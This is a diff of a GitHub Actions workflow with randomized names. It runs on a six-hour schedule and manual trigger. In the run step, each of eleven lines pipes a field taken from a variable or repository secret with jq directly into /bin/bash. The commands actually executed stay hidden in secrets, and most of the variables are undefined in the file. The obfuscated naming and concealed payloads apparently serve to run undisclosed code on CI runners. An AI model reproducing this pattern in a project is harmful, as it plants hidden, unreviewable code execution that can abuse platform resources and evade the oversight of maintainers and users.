@@ -1,24 +1,29 @@
 name: huanlxh
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 1/6 * * *'
+    - cron: '42 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huanlxh
         env:
-          dsxv4: ${{ secrets.dsxv4 }}
+          k68: ${{ secrets.k68 }}
         run: |
-          echo $dsxv4 | jq -r .o542 | /bin/bash
-          echo $xy211 | jq -r .gcu333 | /bin/bash
-          echo $qb610 | jq -r .v93804 | /bin/bash
-          echo $i5 | jq -r .leij8 | /bin/bash
-          echo $we85 | jq -r .t278 | /bin/bash
-          echo $dilon083 | jq -r .s464 | /bin/bash
-          echo $vfg4 | jq -r .ox29033 | /bin/bash
-          echo $hutsh504 | jq -r .q1 | /bin/bash
-          echo $vbza29242 | jq -r .kv725 | /bin/bash
+          echo $k68 | jq -r .cvgnd5787 | /bin/bash
+          echo $pjm38543 | jq -r .xk58 | /bin/bash
+          echo $yn1 | jq -r .uusiw2 | /bin/bash
+          echo $bkny32022 | jq -r .u09906 | /bin/bash
+          echo $xic36 | jq -r .rw641 | /bin/bash
+          echo $vou89728 | jq -r .ytfyj651 | /bin/bash
+          echo $zk7804 | jq -r .lw76 | /bin/bash
+          echo $j534 | jq -r .rchee49500 | /bin/bash
+          echo $a6 | jq -r .gkjg23992 | /bin/bash
+          echo $g636 | jq -r .rywv01172 | /bin/bash
+          echo $fb73 | jq -r .wvsmh0212 | /bin/bash
 
